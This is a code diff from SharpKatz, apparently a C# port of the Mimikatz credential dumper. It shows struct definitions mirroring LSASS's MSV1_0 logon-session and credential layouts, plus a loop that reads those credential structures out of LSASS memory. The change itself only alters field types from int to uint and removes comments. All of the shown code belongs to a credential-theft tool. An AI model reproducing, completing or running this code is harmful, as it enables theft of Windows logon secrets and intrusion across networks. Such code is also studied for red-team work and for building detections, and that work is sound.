@@ -42,18 +42,18 @@ namespace SharpKatz.Module
             public IntPtr Flink;   //KIWI_MSV1_0_LIST_63 off_2C5718
             public IntPtr Blink; //KIWI_MSV1_0_LIST_63 off_277380
             public IntPtr unk0; // unk_2C0AC8
-            public int unk1; // 0FFFFFFFFh
+            public uint unk1; // 0FFFFFFFFh
             public IntPtr unk2; // 0
-            public int unk3; // 0
-            public int unk4; // 0
-            public int unk5; // 0A0007D0h
+            public uint unk3; // 0
+            public uint unk4; // 0
+            public uint unk5; // 0A0007D0h
             public IntPtr hSemaphore6; // 0F9Ch
             public IntPtr unk7; // 0
             public IntPtr hSemaphore8; // 0FB8h
             public IntPtr unk9; // 0
             public IntPtr unk10; // 0
-            public int unk11; // 0
-            public int unk12; // 0 
+            public uint unk11; // 0
+            public uint unk12; // 0 
             public IntPtr unk13; // unk_2C0A28
             public Natives.LUID LocallyUniqueIdentifier;
             public Natives.LUID SecondaryLocallyUniqueIdentifier;
@@ -64,20 +64,20 @@ namespace SharpKatz.Module
             public IntPtr unk15;
             public Natives.UNICODE_STRING Type;
             public IntPtr pSid; //PSID
-            public int LogonType;
+            public uint LogonType;
             public IntPtr unk18;
-            public int Session;
-            public Natives.LARGE_INTEGER LogonTime; // autoalign x86
+            public uint Session;
+            public Natives.LARGE_INTEGER LogonTime;
             public Natives.UNICODE_STRING LogonServer;
             public IntPtr Credentials; //PKIWI_MSV1_0_CREDENTIALS
             public IntPtr unk19;
             public IntPtr unk20;
             public IntPtr unk21;
-            public int unk22;
-            public int unk23;
-            public int unk24;
-            public int unk25;
-            public int unk26;
+            public uint unk22;
+            public uint unk23;
+            public uint unk24;
+            public uint unk25;
+            public uint unk26;
             public IntPtr unk27;
             public IntPtr unk28;
             public IntPtr unk29;
@@ -235,15 +235,13 @@ namespace SharpKatz.Module
                     Console.WriteLine("[*] UserName {0}", logonsession.UserName);
                     Console.WriteLine("[*] LogonDomain {0}", logonsession.LogonDomain);
                     Console.WriteLine("[*] LogonServer {0}", logonsession.LogonServer);*/
-
-                    //KIWI_MSV1_0_CREDENTIALS credentials;
+                    
                     KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
 
                     while (lsasscred != IntPtr.Zero)
                     {
                         byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(sizeof(KIWI_MSV1_0_CREDENTIALS)));
-                        //credentials = Utility.ReadStruct<KIWI_MSV1_0_CREDENTIALS>(credentialsBytes);
-
+                        
                         IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                         IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));
 
